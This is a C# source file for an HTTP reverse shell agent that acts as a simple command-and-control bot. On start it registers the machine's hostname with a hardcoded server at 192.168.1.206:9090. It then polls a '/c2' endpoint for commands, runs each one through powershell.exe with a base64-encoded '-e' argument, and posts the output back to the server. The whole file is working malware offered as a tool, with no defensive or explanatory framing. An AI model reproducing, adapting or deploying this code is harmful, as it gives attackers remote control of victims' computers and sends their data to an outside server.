using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text;
using System.Text.Json;

class HttpRevShell
{

    public static string revision = "NULL";

    static async Task<string> runAndSend(string cmd, string url) {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(cmd);
        byte[] bytesTob64Encode = new byte[plainTextBytes.Length*2];
        //Console.WriteLine($"{plainTextBytes.Length*2} - {plainTextBytes.Length}");
        for (int i = 0, j = 0; i < plainTextBytes.Length*2; i += 2, j += 1){
            Console.WriteLine($"{i} - {j}");
            bytesTob64Encode[i] = plainTextBytes[j];
            bytesTob64Encode[i+1] = 0x00;
        }
        //Console.WriteLine(plainTextBytes.Length*2);
        var cmdb64 = System.Convert.ToBase64String(bytesTob64Encode);

        // Executing Process
        Process process = new Process();
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        // Set the StartInfo.FileName property to the path of the CMD executable.
        process.StartInfo.FileName = "powershell.exe";
        // Set the StartInfo.Arguments property to the CMD command that you want to execute.
        process.StartInfo.Arguments = $"-e {cmdb64}";
        // Start the process.
        process.Start();
        // Wait for the process to finish.
        process.WaitForExit();
        // Read the output of the process.
        string output = process.StandardOutput.ReadToEnd();
        plainTextBytes = System.Text.Encoding.UTF8.GetBytes(output);
        var b64 = System.Convert.ToBase64String(plainTextBytes);
        Console.WriteLine(b64);


        var postData = new
        {
            bot = getHostname(),
            result = b64
        };
        string json = System.Text.Json.JsonSerializer.Serialize(postData);
        // Send the POST request
        using (HttpClient client = new HttpClient())
        {
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            Console.WriteLine(content);
            try
            {
                HttpResponseMessage response = await client.PostAsync(url+"c2", content);

                if (response.IsSuccessStatusCode)
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    //Console.WriteLine("Response received: " + responseContent);
                }
                else
                {
                    Console.WriteLine($"Error: {response.StatusCode} - {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception 02: " + ex.Message);
            }
        }

        return b64;
    }

    static async Task<string> checkForIncomingCommands(string url)
    {
        
        using (HttpClient client = new HttpClient())
        {
            try
            {
                // Perform the GET request
                HttpResponseMessage response = await client.GetAsync(url+"c2");

                // Check if the request was successful
                if (response.IsSuccessStatusCode)
                {
                    string responseBody = await response.Content.ReadAsStringAsync();

                    // Parse the response body into a JSON object
                    var json = JsonSerializer.Deserialize<JsonElement>(responseBody);
                    //Console.WriteLine("Response JSON:");
                    //Console.WriteLine(JsonSerializer.Serialize(json, new JsonSerializerOptions { WriteIndented = true }));
                    //Console.WriteLine(json.GetProperty("rev").GetString());
                    //Console.WriteLine($"{getHostname()} - {json.GetProperty("bot").GetString()}");
                    if (HttpRevShell.revision != json.GetProperty("rev").GetString() && getHostname() == json.GetProperty("bot").GetString()) {
                        HttpRevShell.revision = json.GetProperty("rev").GetString();
                        return json.GetProperty("cmd").GetString();
                    } else {
                        return "";
                    }

                }
                else
                {
                    Console.WriteLine($"Error: {response.StatusCode} - {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception 01: " + ex.Message);
            }
            return "";
        }
    }

    static string getHostname()
    {
        // Executing Process
        Process process = new Process();
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        // Set the StartInfo.FileName property to the path of the CMD executable.
        process.StartInfo.FileName = "hostname.exe";
        // Start the process.
        process.Start();
        // Wait for the process to finish.
        process.WaitForExit();
        // Read the output of the process.
        string output = process.StandardOutput.ReadToEnd();
        return output.Replace("\n", String.Empty).Replace("\r", String.Empty);
    }
    static async Task Main(string[] args)
    {
        string ip = "192.168.1.206";
        string port = "9090";
        string url = $"http://{ip}:{port}/";
        
        ////////////////////
        //  Presentation  //
        ////////////////////

        // Create the data to send in the POST request
        var postData = new
        {
            botname = getHostname()
        };
        string json = System.Text.Json.JsonSerializer.Serialize(postData);
        // Send the POST request
        using (HttpClient client = new HttpClient())
        {
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            Console.WriteLine(content);
            try
            {
                HttpResponseMessage response = await client.PostAsync(url+"welcome", content);

                if (response.IsSuccessStatusCode)
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    //Console.WriteLine("Response received: " + responseContent);
                }
                else
                {
                    Console.WriteLine($"Error: {response.StatusCode} - {response.ReasonPhrase}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Exception 02: " + ex.Message);
            }
        }

        
        while (true) {
            
            string cmd = await checkForIncomingCommands(url);
            if(cmd != "") {
                Console.WriteLine(cmd);
                runAndSend(cmd, url);
            }

            Thread.Sleep(800);
        }
    }
}